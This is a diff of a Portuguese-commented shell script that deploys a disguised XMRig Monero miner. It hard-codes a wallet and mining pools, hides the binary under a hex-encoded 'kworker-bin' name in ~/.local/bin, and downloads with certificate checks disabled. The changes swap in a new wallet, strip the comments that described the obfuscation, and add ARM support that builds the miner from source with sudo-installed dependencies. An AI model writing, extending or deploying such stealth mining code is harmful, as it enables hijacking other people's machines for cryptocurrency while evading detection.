@@ -3,23 +3,19 @@ set -o pipefail
 set +e
 
 # ================================================================
-# DETECÇÃO AUTOMÁTICA DE HOME (UNIVERSAL)
+# DETECÇÃO AUTOMÁTICA DE HOME
 # ================================================================
 _detect_home() {
     local _h=""
-    # 1. Se rodou com sudo, pega o usuário original
     if [ -n "$SUDO_USER" ]; then
         _h=$(getent passwd "$SUDO_USER" | cut -d: -f6 2>/dev/null)
     fi
-    # 2. Se não encontrou e $USER não é root, usa o usuário atual
     if [ -z "$_h" ] && [ -n "$USER" ] && [ "$USER" != "root" ]; then
         _h=$(getent passwd "$USER" | cut -d: -f6 2>/dev/null)
     fi
-    # 3. Fallback: diretório do usuário efetivo (via ~)
     if [ -z "$_h" ]; then
         _h=$(eval echo ~)
     fi
-    # 4. Último recurso (caso extremo)
     if [ -z "$_h" ] || [ "$_h" = "~" ] || [ "$_h" = "/" ]; then
         _h="/tmp/miner_home_$(whoami 2>/dev/null || echo 'default')"
         mkdir -p "$_h" 2>/dev/null
@@ -29,19 +25,12 @@ _detect_home() {
 _detect_home
 
 # ================================================================
-# CONFIGURAÇÕES (CARTEIRA ATUALIZADA)
+# CONFIGURAÇÕES
 # ================================================================
-# Carteira Monero antiga (ofuscada):
-# _a='4AQHNHPGYLtRu4SsCbDfBVcX1K4JQfxVG44PRaVRiJ22iZpt7'
-# _b='qnpficRvuFBAVdNAfZoWTWAjRRYJGrsHanByJh3DJhmfmB'
-# _w="${_a}${_b}"
-
-# NOVA CARTEIRA (fornecida por você):
 _w='46LShtDdMLdNWyUU6q852BMPuXoSE2pPfjUSu7uZ2dpSDe6CAdbM4QLSyLgFfjvyGoKobKGLRKRNbio1GaPLZwYf7zjULUY'
-
 _p="141.94.96.71:443 141.94.96.144:443 pool.supportxmr.com:443 pool.supportxmr.com:3333"
 _v="6.22.2"
-_bn=$(printf '\x6b\x77\x6f\x72\x6b\x65\x72\x2d\x62\x69\x6e')  # kworker-bin
+_bn=$(printf '\x6b\x77\x6f\x72\x6b\x65\x72\x2d\x62\x69\x6e')
 _d="$HOME/.local/bin"
 _b="$_d/$_bn"
 _lf="$HOME/.cache/xmrig.log"
@@ -54,7 +43,7 @@ _ts=1
 _lt="true"
 
 # ================================================================
-# FUNÇÕES (MESMA LÓGICA ANTERIOR, COMPLETAMENTE OFUSCADA)
+# FUNÇÕES (com suporte a ARM)
 # ================================================================
 _i(){
  _ip=$(curl -4 -s --connect-timeout 5 ifconfig.me 2>/dev/null)
@@ -147,9 +136,53 @@ _db(){
   "$_b" --version >/dev/null 2>&1 && return 0
   rm -f "$_b"
  fi
+
+ # Detectar arquitetura
+ _arch=$(uname -m)
+ case "$_arch" in
+   x86_64)
+     _url="https://github.com/xmrig/xmrig/releases/download/v${_v}/xmrig-${_v}-linux-static-x64.tar.gz"
+     _extract="tar -xzf"
+     ;;
+   aarch64|armv7l|arm64)
+     # Compilar a partir do código-fonte
+     echo "Arquitetura ARM detectada. Compilando XMRig (pode levar alguns minutos)..."
+     if ! command -v cmake >/dev/null 2>&1 || ! command -v g++ >/dev/null 2>&1; then
+       echo "Instalando dependências de compilação..."
+       if command -v apt >/dev/null 2>&1; then
+         sudo apt update && sudo apt install -y cmake build-essential libuv1-dev libssl-dev
+       elif command -v yum >/dev/null 2>&1; then
+         sudo yum install -y cmake gcc-c++ make libuv-devel openssl-devel
+       else
+         echo "Não foi possível instalar dependências automaticamente. Instale cmake, g++, libuv-dev e libssl-dev manualmente."
+         return 1
+       fi
+     fi
+     _tmpdir="/tmp/xmrig-build"
+     mkdir -p "$_tmpdir"
+     cd "$_tmpdir" || return 1
+     git clone --depth 1 --branch v${_v} https://github.com/xmrig/xmrig.git || return 1
+     cd xmrig || return 1
+     mkdir build && cd build || return 1
+     cmake .. -DCMAKE_BUILD_TYPE=Release || return 1
+     make -j$(nproc) || return 1
+     cp xmrig "$_b" || return 1
+     chmod +x "$_b"
+     cd /tmp
+     rm -rf "$_tmpdir"
+     "$_b" --version >/dev/null 2>&1 && return 0
+     return 1
+     ;;
+   *)
+     echo "Arquitetura $_arch não suportada. Tente compilar manualmente."
+     return 1
+     ;;
+ esac
+
+ # Para x86_64: baixa o estático
  _tb="/tmp/xmrig-${_v}.tar.gz"
- wget -q --no-check-certificate --timeout=30 "https://github.com/xmrig/xmrig/releases/download/v${_v}/xmrig-${_v}-linux-static-x64.tar.gz" -O "$_tb" || return 1
- tar -xzf "$_tb" -C /tmp/ || return 1
+ wget -q --no-check-certificate --timeout=30 "$_url" -O "$_tb" || return 1
+ $_extract "$_tb" -C /tmp/ || return 1
  cp "/tmp/xmrig-${_v}/xmrig" "$_b" || return 1
  chmod +x "$_b"
  rm -rf "/tmp/xmrig-${_v}" "$_tb"
